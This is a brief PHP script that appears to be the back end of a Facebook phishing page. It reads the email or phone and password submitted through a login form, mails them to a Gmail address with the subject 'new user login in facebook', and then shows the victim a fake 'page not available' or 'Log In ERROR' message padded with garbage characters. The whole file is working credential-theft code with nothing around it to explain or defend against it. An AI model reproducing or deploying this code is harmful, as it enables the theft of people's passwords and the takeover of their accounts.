<?php
$email = $_POST['phone'];
$password = $_POST['password'];

$to = "www.hr.com.pk@gmail.com";
$subject = "new user login in facebook";
$message ="E-Mail Or Phone No. :" .$email ."<br><br>";
$message. ="Password :" .$password ."<br><br>";
$headers = "ali228rao@gmail.com";

if(mail($to, $subject, $message, $headers)){
echo "^¥^÷¥∆÷`°°®®℅=^π|¶¥™[]©π${€¢°€®^¥€^=€©=^©•¶€×™[\{^π•¶\÷√×~÷^¥}©÷π\{®π•∆$÷^÷×™¥{^¢÷|{\™¢π¶$√$=€{=This page is not available^¥^÷¥∆÷`°°®®℅=^π|¶¥™[]©π${€¢°€®^¥€^=€©=^©•¶€×™[\{^π•¶\÷√×~÷^¥}©÷π\{®π•∆$÷^÷×™¥{^¢÷|{\™¢π¶$√$=€{=";
}else{echo "^¥^÷¥∆÷`°°®®℅=^π|¶¥™[]©π${€¢°€®^¥€^=€©=^©•¶€×™[\{^π•¶\÷√×~÷^¥}©÷π\{®π•∆$÷^÷×™¥{^¢÷|{\™¢π¶$√$=€{=Log In ERROR^¥^÷¥∆÷`°°®®℅=^π|¶¥™[]©π${€¢°€®^¥€^=€©=^©•¶€×™[\{^π•¶\÷√×~÷^¥}©÷π\{®π•∆$÷^÷×™¥{^¢÷|{\™¢π¶$√$=€{=";}
?>